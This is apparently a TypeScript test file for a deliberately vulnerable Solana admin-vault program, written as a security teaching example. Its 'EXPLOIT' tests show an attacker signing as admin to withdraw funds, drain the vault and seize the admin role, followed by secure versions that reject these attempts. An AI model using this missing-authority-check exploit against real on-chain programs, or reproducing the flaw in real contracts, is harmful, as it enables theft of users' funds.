import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { AdminVault } from "../target/types/admin_vault";
import { expect } from "chai";
import { Keypair, PublicKey, SystemProgram } from "@solana/web3.js";

describe("Authority Check Failure Exploit", () => {
  // Configure the client to use the local cluster
  anchor.setProvider(anchor.AnchorProvider.env());

  const program = anchor.workspace.AdminVault as Program<AdminVault>;
  const provider = anchor.getProvider();

  // Test accounts
  let legitimateAdmin: Keypair;
  let vaultOwner: Keypair;
  let attacker: Keypair;
  let vault: Keypair;

  beforeEach(async () => {
    // Generate fresh keypairs for each test
    legitimateAdmin = Keypair.generate();
    vaultOwner = Keypair.generate();
    attacker = Keypair.generate();
    vault = Keypair.generate();

    // Airdrop SOL to test accounts
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(legitimateAdmin.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL)
    );
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(vaultOwner.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL)
    );
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(attacker.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL)
    );
  });

  describe("Vulnerable Implementation Exploits", () => {
    it("EXPLOIT: Unauthorized admin withdrawal - any signer can withdraw as admin", async () => {
      // First, initialize a vault with the legitimate admin
      await program.methods
        .vulnerableInitialize(new anchor.BN(1000))
        .accounts({
          vault: vault.publicKey,
          admin: legitimateAdmin.publicKey,
          owner: vaultOwner.publicKey,
          payer: legitimateAdmin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([vault, legitimateAdmin])
        .rpc();

      // Verify initial state
      let vaultAccount = await program.account.adminVault.fetch(vault.publicKey);
      expect(vaultAccount.balance.toNumber()).to.equal(1000);
      expect(vaultAccount.admin.toString()).to.equal(legitimateAdmin.publicKey.toString());

      // EXPLOIT: Attacker can withdraw funds by passing themselves as admin
      // The vulnerable function only checks that someone signed, not that they're THE admin
      await program.methods
        .vulnerableAdminWithdraw(new anchor.BN(500))
        .accounts({
          vault: vault.publicKey,
          admin: attacker.publicKey, // Attacker passes themselves as admin!
        })
        .signers([attacker]) // Attacker signs the transaction
        .rpc();

      // Verify the exploit succeeded - balance was reduced even though attacker isn't the real admin
      vaultAccount = await program.account.adminVault.fetch(vault.publicKey);
      expect(vaultAccount.balance.toNumber()).to.equal(500);
      console.log("ðŸš¨ EXPLOIT SUCCESS: Attacker withdrew 500 tokens without being the real admin!");
    });

    it("EXPLOIT: Unauthorized emergency drain - any signer can drain any vault", async () => {
      // Initialize vault with legitimate admin
      await program.methods
        .vulnerableInitialize(new anchor.BN(2000))
        .accounts({
          vault: vault.publicKey,
          admin: legitimateAdmin.publicKey,
          owner: vaultOwner.publicKey,
          payer: legitimateAdmin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([vault, legitimateAdmin])
        .rpc();

      // EXPLOIT: Attacker can drain the entire vault
      await program.methods
        .vulnerableEmergencyDrain()
        .accounts({
          vault: vault.publicKey,
          admin: attacker.publicKey, // Attacker passes themselves as admin!
        })
        .signers([attacker])
        .rpc();

      // Verify the exploit succeeded - entire vault was drained
      const vaultAccount = await program.account.adminVault.fetch(vault.publicKey);
      expect(vaultAccount.balance.toNumber()).to.equal(0);
      console.log("ðŸš¨ EXPLOIT SUCCESS: Attacker drained entire vault without being the real admin!");
    });

    it("EXPLOIT: Unauthorized admin change - any signer can change vault admin", async () => {
      // Initialize vault with legitimate admin
      await program.methods
        .vulnerableInitialize(new anchor.BN(1000))
        .accounts({
          vault: vault.publicKey,
          admin: legitimateAdmin.publicKey,
          owner: vaultOwner.publicKey,
          payer: legitimateAdmin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([vault, legitimateAdmin])
        .rpc();

      // EXPLOIT: Attacker can change the admin to themselves
      await program.methods
        .vulnerableChangeAdmin(attacker.publicKey)
        .accounts({
          vault: vault.publicKey,
          currentAdmin: attacker.publicKey, // Attacker passes themselves as current admin!
        })
        .signers([attacker])
        .rpc();

      // Verify the exploit succeeded - admin was changed
      const vaultAccount = await program.account.adminVault.fetch(vault.publicKey);
      expect(vaultAccount.admin.toString()).to.equal(attacker.publicKey.toString());
      console.log("ðŸš¨ EXPLOIT SUCCESS: Attacker changed vault admin without being the real admin!");
    });
  });

  describe("Secure Implementation Protection", () => {
    it("PROTECTION: Secure admin withdrawal blocks unauthorized access", async () => {
      // Initialize vault with secure function
      await program.methods
        .secureInitialize(new anchor.BN(1000))
        .accounts({
          vault: vault.publicKey,
          admin: legitimateAdmin.publicKey,
          owner: vaultOwner.publicKey,
          payer: legitimateAdmin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([vault, legitimateAdmin, vaultOwner])
        .rpc();

      // PROTECTION: Attacker cannot withdraw - secure function validates admin authority
      try {
        await program.methods
          .secureAdminWithdraw(new anchor.BN(500))
          .accounts({
            vault: vault.publicKey,
            admin: attacker.publicKey, // Attacker tries to pass themselves as admin
          })
          .signers([attacker])
          .rpc();
        
        // If we reach here, the protection failed
        expect.fail("Expected transaction to fail due to unauthorized admin");
      } catch (error) {
        // Verify the error is due to authority validation failure
        expect(error.toString()).to.include("has_one");
        console.log("âœ… PROTECTION SUCCESS: Secure function blocked unauthorized withdrawal");
      }

      // Verify vault balance unchanged
      const vaultAccount = await program.account.adminVault.fetch(vault.publicKey);
      expect(vaultAccount.balance.toNumber()).to.equal(1000);
    });

    it("PROTECTION: Secure emergency drain blocks unauthorized access", async () => {
      // Initialize vault with secure function
      await program.methods
        .secureInitialize(new anchor.BN(2000))
        .accounts({
          vault: vault.publicKey,
          admin: legitimateAdmin.publicKey,
          owner: vaultOwner.publicKey,
          payer: legitimateAdmin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([vault, legitimateAdmin, vaultOwner])
        .rpc();

      // PROTECTION: Attacker cannot drain vault
      try {
        await program.methods
          .secureEmergencyDrain()
          .accounts({
            vault: vault.publicKey,
            admin: attacker.publicKey,
          })
          .signers([attacker])
          .rpc();
        
        expect.fail("Expected transaction to fail due to unauthorized admin");
      } catch (error) {
        expect(error.toString()).to.include("has_one");
        console.log("âœ… PROTECTION SUCCESS: Secure function blocked unauthorized drain");
      }

      // Verify vault balance unchanged
      const vaultAccount = await program.account.adminVault.fetch(vault.publicKey);
      expect(vaultAccount.balance.toNumber()).to.equal(2000);
    });

    it("PROTECTION: Secure admin change blocks unauthorized access", async () => {
      // Initialize vault with secure function
      await program.methods
        .secureInitialize(new anchor.BN(1000))
        .accounts({
          vault: vault.publicKey,
          admin: legitimateAdmin.publicKey,
          owner: vaultOwner.publicKey,
          payer: legitimateAdmin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([vault, legitimateAdmin, vaultOwner])
        .rpc();

      // PROTECTION: Attacker cannot change admin
      try {
        await program.methods
          .secureChangeAdmin(attacker.publicKey)
          .accounts({
            vault: vault.publicKey,
            admin: attacker.publicKey,
          })
          .signers([attacker])
          .rpc();
        
        expect.fail("Expected transaction to fail due to unauthorized admin");
      } catch (error) {
        expect(error.toString()).to.include("UnauthorizedAdmin");
        console.log("âœ… PROTECTION SUCCESS: Secure function blocked unauthorized admin change");
      }

      // Verify admin unchanged
      const vaultAccount = await program.account.adminVault.fetch(vault.publicKey);
      expect(vaultAccount.admin.toString()).to.equal(legitimateAdmin.publicKey.toString());
    });
  });

  describe("Legitimate Operations", () => {
    it("LEGITIMATE: Real admin can perform all operations on secure implementation", async () => {
      // Initialize vault with secure function
      await program.methods
        .secureInitialize(new anchor.BN(1000))
        .accounts({
          vault: vault.publicKey,
          admin: legitimateAdmin.publicKey,
          owner: vaultOwner.publicKey,
          payer: legitimateAdmin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([vault, legitimateAdmin, vaultOwner])
        .rpc();

      // LEGITIMATE: Real admin can withdraw
      await program.methods
        .secureAdminWithdraw(new anchor.BN(300))
        .accounts({
          vault: vault.publicKey,
          admin: legitimateAdmin.publicKey, // Real admin
        })
        .signers([legitimateAdmin]) // Real admin signs
        .rpc();

      let vaultAccount = await program.account.adminVault.fetch(vault.publicKey);
      expect(vaultAccount.balance.toNumber()).to.equal(700);
      console.log("âœ… LEGITIMATE: Real admin successfully withdrew funds");

      // LEGITIMATE: Real admin can change admin
      const newAdmin = Keypair.generate();
      await program.methods
        .secureChangeAdmin(newAdmin.publicKey)
        .accounts({
          vault: vault.publicKey,
          admin: legitimateAdmin.publicKey, // Current real admin
        })
        .signers([legitimateAdmin])
        .rpc();

      vaultAccount = await program.account.adminVault.fetch(vault.publicKey);
      expect(vaultAccount.admin.toString()).to.equal(newAdmin.publicKey.toString());
      console.log("âœ… LEGITIMATE: Real admin successfully changed admin");

      // LEGITIMATE: New admin can perform emergency drain
      await provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(newAdmin.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL)
      );

      await program.methods
        .secureEmergencyDrain()
        .accounts({
          vault: vault.publicKey,
          admin: newAdmin.publicKey, // New real admin
        })
        .signers([newAdmin])
        .rpc();

      vaultAccount = await program.account.adminVault.fetch(vault.publicKey);
      expect(vaultAccount.balance.toNumber()).to.equal(0);
      console.log("âœ… LEGITIMATE: New admin successfully performed emergency drain");
    });
  });
});